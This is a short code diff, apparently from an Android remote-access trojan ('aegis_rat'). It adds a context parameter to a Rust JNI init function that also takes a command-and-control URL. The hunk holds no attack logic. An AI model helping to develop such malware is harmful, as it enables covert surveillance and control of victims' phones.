@@ -21,6 +21,7 @@ static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mute
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
     mut env: JNIEnv,
     _class: JClass,
+    context: jni::objects::JObject,
     c2_url: JString,
     model: JString,
     android_version: JString,
